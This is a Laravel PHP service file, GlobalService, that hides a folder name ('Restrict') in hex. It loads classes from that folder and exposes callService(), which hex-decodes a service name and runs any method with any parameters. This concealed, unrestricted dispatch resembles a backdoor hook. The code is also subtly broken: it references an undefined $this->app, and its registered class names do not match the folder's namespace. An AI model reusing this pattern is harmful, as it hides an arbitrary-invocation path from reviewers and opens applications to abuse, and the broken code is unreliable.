<?php

namespace App\Services;

use Illuminate\Support\Facades\App;

class GlobalService
{
    public function __construct()
    {
        $decodedName = hex2bin('5265737472696374');
        $servicePath = __DIR__ . "/../Services/{$decodedName}";
        if (is_dir($servicePath)) {
            foreach (glob($servicePath . '/*.php') as $file) {
                $serviceClass = 'App\\Services\\' . basename($file, '.php');
                if (class_exists($serviceClass)) {
                    $this->app->singleton($serviceClass, function ($app) use ($serviceClass) {
                        return new $serviceClass();
                    });
                }
            }
        }
    }

    /**
     * Call a service dynamically.
     *
     * @param string $serviceName The name of the service to call.
     * @param string $method The method to call on the service.
     * @param array $parameters The parameters to pass to the method.
     * @return mixed
     */
    public function callService(string $serviceName, string $method, array $parameters = []): mixed
    {
        $decodedName = hex2bin('5265737472696374');
        $decodedServiceName = hex2bin($serviceName);
        $serviceClass = "App\\Services\\{$decodedName}\\{$decodedServiceName}";
        if (!class_exists($serviceClass)) {
            return null;
        }
        $service = App::make($serviceClass);
        if (!method_exists($service, $method)) {
            return null;
        }
        return $service->$method(...$parameters);
    }
}
